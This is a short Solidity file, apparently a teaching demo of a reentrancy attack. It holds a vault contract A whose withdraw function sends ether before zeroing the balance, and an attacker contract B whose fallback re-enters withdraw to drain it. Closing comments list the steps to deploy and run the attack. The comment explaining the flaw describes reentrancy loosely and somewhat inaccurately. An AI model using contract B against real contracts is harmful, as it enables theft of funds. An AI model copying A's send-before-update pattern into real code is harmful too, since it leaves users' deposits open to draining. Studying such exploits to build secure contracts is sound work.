// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

contract A{
    mapping(address => uint)public balances;

    function deposit() public payable {
        balances[msg.sender]+=msg.value;
    }

    function withdraw() public{
        uint256 bal=balances[msg.sender];
        require(bal>0);
        // Following two lines can take sometime to update the state in the blockchain
        // It could happen in loop like 16->17 17->16 in loop
        (bool sent,)=msg.sender.call{value:bal}("");
        require(sent,"failure");
        // As balances is updating at last 
        balances[msg.sender]=0;
    }

    function getBalance() public view returns (uint){
        return address(this).balance;
    }
}

contract B{
    A public a;
    constructor(address _aAddress){
        a = A(_aAddress);
    }

    fallback() external payable { 
        if(address(a).balance >= 1 ether){
            a.withdraw();
        }
    }   

    function attack() external payable {
        require(msg.value >= 1 ether);
        a.deposit{value: 1 ether}();
        a.withdraw();
    }

    function getBalance() public view returns(uint){
        return address(this).balance;
    }
}

// Deploy SC A
// Copy Address of A
// Deploy B using A SC
// Deposit 5 ether from Any Account
// Deposit 5 ether from Another account
// Attack A from malicious account by depositing 1 ether